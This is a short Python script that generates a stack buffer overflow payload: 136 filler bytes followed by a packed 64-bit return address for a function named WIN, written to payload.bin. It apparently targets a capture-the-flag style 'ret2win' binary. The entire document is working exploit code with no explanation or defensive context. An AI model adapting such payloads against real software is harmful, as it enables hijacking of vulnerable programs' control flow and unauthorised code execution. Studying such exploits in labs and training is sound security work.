import struct

OFFSET = 136
WIN = 0x4012d6

def main():
    payload = b"A" * OFFSET + struct.pack("<Q", WIN)   
    with open("payload.bin", "wb") as f:
        f.write(payload)
    
    print(f"wrote payload.bin: {len(payload)} bytes, win @ {hex(WIN)}")

if __name__== "__main__":
    main()